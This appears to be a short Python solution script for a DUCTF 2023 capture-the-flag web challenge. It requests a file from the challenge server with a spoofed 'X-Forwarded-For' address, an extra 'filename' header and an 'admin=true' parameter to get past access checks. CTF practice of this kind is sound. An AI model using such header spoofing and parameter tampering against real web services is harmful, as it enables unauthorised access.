import requests

URL = 'https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt'
HEADERS = {'X-Forwarded-For':'31.33.33.7', 'filename':'not_the_flag.txt'}
PARAMS = {'admin':'true'}

r = requests.get(url = URL, params = PARAMS, headers = HEADERS)

text = r.text

print(text)
